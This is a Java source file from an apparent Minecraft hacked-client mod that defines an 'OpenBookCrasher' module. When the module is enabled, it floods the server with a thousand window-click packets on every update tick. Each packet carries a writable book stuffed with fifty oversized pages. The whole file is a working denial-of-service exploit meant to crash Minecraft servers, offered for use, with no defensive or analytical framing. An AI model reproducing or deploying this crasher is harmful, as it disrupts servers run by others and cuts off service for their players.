package com.teamti.timc.modules.crasher.obc;

import com.teamti.timc.event.EventManager;
import com.teamti.timc.main.TIMC;
import com.teamti.timc.main.Module;
import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.play.client.C0EPacketClickWindow;
import org.lwjgl.input.Keyboard;

public class OpenBookCrasher extends Module {

	public static boolean isEnabled;

	public OpenBookCrasher() {
		super("OpenBookCrasher", Keyboard.KEY_NONE);
		this.jelloCat = TIMC.tabgui.cats.get(2);
	}

	public void onEnable() {
		isEnabled = true;
		EventManager.register(this);
	}

	public void onDisable() {
		EventManager.unregister(this);
		isEnabled = false;

	}

	public void onUpdate() {
		for (int i = 0; i < 1000; ++i) {
			Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(
					new C0EPacketClickWindow(0, -999, 0, 3, bigBook(), (short) 0));
		}
	}


	public static ItemStack bigBook() {
		ItemStack itemStack = new ItemStack(Items.writable_book);
	    NBTTagCompound bookCompound = new NBTTagCompound();
        String author = Minecraft.getMinecraft().getSession().getUsername();
        String title = "Play with me.";
        String size = "4567238567845678945678956782984567890187456789024567815467894067345739374632493246348465438436542376452386453645234763254872345324897245672385678456789456789567829845678901874567890245678154678940673457393746324932463484654384365423764523864536452347632548723453248972456723856784567894567895678298456789018745678902456781546789406734573937463249324634846543843654237645238645364523476325487234532489724567238567845678945678956782984567890187456789024567815467894067345739374632493246348465438436542376452386453645234763254872345324897245672385678456789456789567829845678901874567890245678154678940673457393746324932463484654384365423764523864536452347632548723453248972";
	    bookCompound.setString("author", author);
	    bookCompound.setString("title", title);
	    NBTTagList pageList = new NBTTagList();
	    String pageText = size;
	    
	
	    for(int page = 0; page < 50; ++page) {
	       pageList.appendTag(new NBTTagString(pageText));
	    }
	
	    bookCompound.setTag("pages", pageList);
	    itemStack.setTagCompound(bookCompound);
	    return itemStack;
	}
}

